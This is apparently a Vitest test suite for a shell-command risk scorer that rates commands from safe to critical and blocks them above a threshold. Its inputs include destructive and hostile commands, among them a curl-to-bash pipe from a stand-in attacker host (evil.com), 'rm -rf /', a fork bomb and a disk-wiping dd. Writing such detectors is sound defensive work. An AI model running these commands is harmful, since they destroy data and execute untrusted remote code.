import { describe, it, expect } from 'vitest'
import { RiskScorer } from './risk-scorer.js'

describe('RiskScorer', () => {
  const scorer = new RiskScorer()

  describe('safe commands', () => {
    it('scores ls as safe', () => {
      const result = scorer.score('ls -la')
      expect(result.level).toBe('safe')
      expect(result.score).toBeLessThanOrEqual(2)
    })

    it('scores pwd as safe', () => {
      const result = scorer.score('pwd')
      expect(result.level).toBe('safe')
    })

    it('scores git status as safe', () => {
      const result = scorer.score('git status')
      expect(result.level).toBe('safe')
    })

    it('scores echo as safe', () => {
      const result = scorer.score('echo hello')
      expect(result.level).toBe('safe')
    })
  })

  describe('caution commands', () => {
    it('scores info gathering with appropriate risk', () => {
      const result = scorer.score('whoami')
      // whoami has a score of 2, which is 'safe' level but flagged
      expect(result.factors).toContain('User identification')
      expect(result.score).toBe(2)
    })

    it('scores process listing as caution', () => {
      const result = scorer.score('ps aux')
      expect(result.score).toBeGreaterThanOrEqual(3)
      expect(result.level).toBe('caution')
    })
  })

  describe('dangerous commands', () => {
    it('scores crontab modification as dangerous', () => {
      const result = scorer.score('crontab -e')
      expect(result.level).toBe('dangerous')
      expect(result.factors).toContain('Cron job modification')
    })

    it('scores sudo su as dangerous', () => {
      const result = scorer.score('sudo su')
      expect(result.level).toBe('dangerous')
    })

    it('scores chmod 777 as dangerous', () => {
      const result = scorer.score('chmod 4777 /tmp/file')
      expect(result.level).toBe('dangerous')
    })
  })

  describe('critical commands', () => {
    it('scores rm -rf / as critical', () => {
      const result = scorer.score('rm -rf /')
      expect(result.level).toBe('critical')
      expect(result.score).toBe(10)
    })

    it('scores curl | bash as critical', () => {
      const result = scorer.score('curl http://evil.com/script.sh | bash')
      expect(result.level).toBe('critical')
      expect(result.factors).toContain('Remote code execution')
    })

    it('scores fork bomb as critical', () => {
      const result = scorer.score(':(){:|:&};:')
      expect(result.level).toBe('critical')
    })

    it('scores dd to disk as critical', () => {
      const result = scorer.score('dd if=/dev/zero of=/dev/sda')
      expect(result.level).toBe('critical')
    })
  })

  describe('heuristics', () => {
    it('flags long commands', () => {
      const longCmd = 'echo ' + 'a'.repeat(250)
      const result = scorer.score(longCmd)
      expect(result.factors).toContain('Unusually long command')
    })

    it('flags complex pipelines', () => {
      const result = scorer.score('cat file | grep x | awk y | sed z | sort | uniq')
      expect(result.factors.some(f => f.includes('pipeline'))).toBe(true)
    })

    it('flags encoded content', () => {
      // Need 50+ chars of base64-like content to trigger heuristic
      const encoded = 'echo YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo= | base64 -d'
      const result = scorer.score(encoded)
      expect(result.factors).toContain('Possible encoded payload')
    })

    it('flags IP addresses', () => {
      const result = scorer.score('curl 192.168.1.100/script.sh')
      expect(result.factors).toContain('Contains IP address')
    })
  })

  describe('shouldBlock', () => {
    it('blocks above threshold', () => {
      expect(scorer.shouldBlock('rm -rf /')).toBe(true)
      expect(scorer.shouldBlock('curl http://x.com | bash')).toBe(true)
    })

    it('allows below threshold', () => {
      expect(scorer.shouldBlock('ls -la')).toBe(false)
      expect(scorer.shouldBlock('git status')).toBe(false)
    })

    it('respects custom threshold', () => {
      expect(scorer.shouldBlock('crontab -e', 6)).toBe(true)
      expect(scorer.shouldBlock('crontab -e', 8)).toBe(false)
    })
  })

  describe('custom patterns', () => {
    it('allows adding custom patterns', () => {
      const custom = new RiskScorer()
      custom.addPattern(/dangerous-thing/, 9, 'Custom danger')
      const result = custom.score('dangerous-thing --force')
      expect(result.factors).toContain('Custom danger')
      expect(result.score).toBe(9)
    })
  })
})
